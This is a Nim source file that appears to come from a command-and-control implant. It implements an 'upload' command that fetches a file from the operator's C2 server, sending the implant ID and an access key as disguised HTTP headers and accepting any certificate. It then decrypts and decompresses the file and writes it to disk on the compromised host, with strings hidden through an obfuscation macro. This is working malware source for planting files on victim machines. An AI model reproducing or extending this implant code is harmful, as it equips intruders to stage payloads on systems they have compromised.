from ../../core/webClientListener import Listener
from os import getcurrentdir, `/`
from strutils import join, split, toLowerAscii
from zippy import uncompress
import ../../util/crypto
import ../../util/strenc  # Import the module containing the obf macro
import puppy

# Upload a file from the C2 server to the Implant
# From Implant's perspective this is similar to wget, but calling to the C2 server instead
proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
    var 
        fileId : string
        fileName : string
        filePath : string
        url : string
    
    # Debug: Print received arguments
    echo obf("DEBUG Upload: Received args: ") & $args.len & obf(" - ") & $args
    
    if args.len == 1 and args[0] != "":
        # Case 1: Only receives fileId (server sends: ["upload", file_id])
        # FileId can be a pure MD5 hash or a path with filename
        fileId = args[0]
        
        # Check if it's a pure MD5 hash (32 hexadecimal characters)
        var isMD5Hash = false
        if fileId.len == 32:
            # Check if all characters are hexadecimal
            isMD5Hash = true
            for c in fileId:
                if c notin {'0'..'9', 'a'..'f', 'A'..'F'}:
                    echo obf("DEBUG Upload: Not a pure MD5 hash - detected non-hex character")
                    isMD5Hash = false
                    break
        
        if isMD5Hash:
            echo obf("DEBUG Upload: Detected pure MD5 hash - will use 'file' as default name")
            fileName = "file"  # Use a generic name since the hash doesn't contain an extension
        else:
            # Try to extract filename from ID as before
            echo obf("DEBUG Upload: Extracting filename from fileId path")
            fileName = fileId.split("/")[^1]  
        
        echo obf("DEBUG Upload: Single arg mode - fileId: ") & fileId & obf(", fileName: ") & fileName
        filePath = getCurrentDir()/fileName
    elif args.len == 2:
        # Case 2: Receives fileId and remotePath, but remotePath might be empty
        fileId = args[0]
        
        echo obf("DEBUG Upload: Two args mode - fileId: ") & fileId & obf(", arg2: ") & args[1]
        
        if args[1] == "" or args[1] == "\"\"":
            # If the second argument is empty, determine the name based on whether it's a hash or not
            var isMD5Hash = false
            if fileId.len == 32:
                # Check if all characters are hexadecimal
                isMD5Hash = true
                for c in fileId:
                    if c notin {'0'..'9', 'a'..'f', 'A'..'F'}:
                        isMD5Hash = false
                        break
            
            if isMD5Hash:
                echo obf("DEBUG Upload: Detected pure MD5 hash with empty path - using 'file' as name")
                fileName = "file"
            else:
                echo obf("DEBUG Upload: Using filename from fileId path")
                fileName = fileId.split("/")[^1]
                
            filePath = getCurrentDir()/fileName
        else:
            # If the second argument is not empty, use it as the full path
            echo obf("DEBUG Upload: Using provided path: ") & args[1]
            filePath = args[1]
    elif args.len == 3 and args[0] != "" and args[1] != "" and args[2] != "":
        # Case 3: Receives fileId, fileName and remotePath
        fileId = args[0]
        fileName = args[1]  # Now we use fileName for the filename
        filePath = args[2]
        echo obf("DEBUG Upload: Three args mode - fileId: ") & fileId & obf(", fileName: ") & fileName & obf(", path: ") & filePath
    elif args.len >= 4:
        # Case 4: In case remotePath has spaces and was split into multiple arguments
        fileId = args[0]
        fileName = args[1]  # Now we use fileName for the filename
        filePath = args[2 .. ^1].join(" ")
        echo obf("DEBUG Upload: Multiple args mode - fileId: ") & fileId & obf(", fileName: ") & fileName & obf(", path: ") & filePath
    else:
        result = obf("Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'.")
        return
    
    # Build URL with fileId (can now be an MD5 hash)
    url = toLowerAscii(li.listenerType) & obf("://")
    if li.listenerHost != "":
        url = url & li.listenerHost
    else:
        url = url & li.listenerIp & obf(":") & li.listenerPort
    url = url & li.taskpath & obf("/") & fileId
    
    echo obf("DEBUG Upload: Requesting file from URL: ") & url

    # Get the file - Puppy will take care of transparent deflation of the gzip layer
    let req = Request(
        url: parseUrl(url),
        headers: @[
                Header(key: obf("User-Agent"), value: li.userAgent),
                Header(key: obf("X-Request-ID"), value: li.id), # Implant ID
                Header(key: obf("Content-MD5"), value: cmdGuid),  # Task GUID
                Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey)
            ],
        allowAnyHttpsCertificate: true,
    )
    let res: Response = fetch(req)

    # Check the result
    if res.code != 200:
        result = obf("Something went wrong uploading the file (Implant did not receive response from staging server '") & url & obf("').")
        return
    
    # Log status code for debugging
    echo obf("DEBUG Upload: Response status: ") & $res.code
    
    # Handle the encrypted and compressed response
    var dec = decryptData(res.body, li.cryptKey)
    var decStr: string = cast[string](dec)
    var fileBuffer: seq[byte] = convertToByteSeq(uncompress(decStr))

    # Check if the server provided the original filename 
    var originalFilename = ""
    
    # Try to get the header directly from the server - this is critical
    try:
        originalFilename = res.headers["X-Original-Filename"]
        if originalFilename != "":
            echo obf("DEBUG Upload: Received original filename from server: ") & originalFilename
            # ALWAYS use the filename provided by the server
            fileName = originalFilename
            echo obf("DEBUG Upload: Using server-provided filename: ") & fileName
    except:
        echo obf("DEBUG Upload: Warning! No X-Original-Filename header found, using default name: ") & fileName
        # The server should ALWAYS provide this header, so this is an error case

    # Determine the final path where the file will be saved
    if args.len >= 2 and args[1] != "" and args[1] != "\"\"":
        # If a specific path was explicitly specified, use it
        echo obf("DEBUG Upload: Using explicitly specified path: ") & filePath
    else:
        # If no specific path, use the current directory with the filename
        filePath = getCurrentDir()/fileName
        echo obf("DEBUG Upload: Using current directory with filename: ") & filePath
        
    filePath.writeFile(fileBuffer)
    result = obf("Uploaded file to '") & filePath & obf("'.")